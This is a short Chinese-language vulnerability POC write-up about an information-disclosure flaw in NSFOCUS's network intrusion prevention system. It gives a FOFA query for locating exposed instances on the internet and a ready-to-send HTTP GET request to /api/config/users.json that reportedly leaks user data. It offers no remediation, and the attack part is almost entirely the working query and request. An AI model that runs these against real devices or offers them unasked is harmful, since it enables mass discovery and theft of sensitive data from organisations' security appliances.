## **漏洞描述**



北京神州绿盟科技有限公司网络入侵防护系统存在信息泄露漏洞，攻击者可利用该漏洞获取敏感信息。

## **影响版本**

##  绿盟网络入侵防护IPS系统 



## ** 漏洞复现**

## **fofa语法**

```
body="We're sorry but ipsweb" || title="NSFOCUS NIDPS"
```

## **漏洞POC**

```yaml
GET /api/config/users.json HTTP/1.1
Host: xxxx
Connection: keep-alive
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
sec-ch-ua-mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script


```

![图片](NIPS%20%E7%BB%BF%E7%9B%9F%E7%BD%91%E7%BB%9C%E5%85%A5%E4%BE%B5%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9Fusers.json%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F.assets/640.webp)
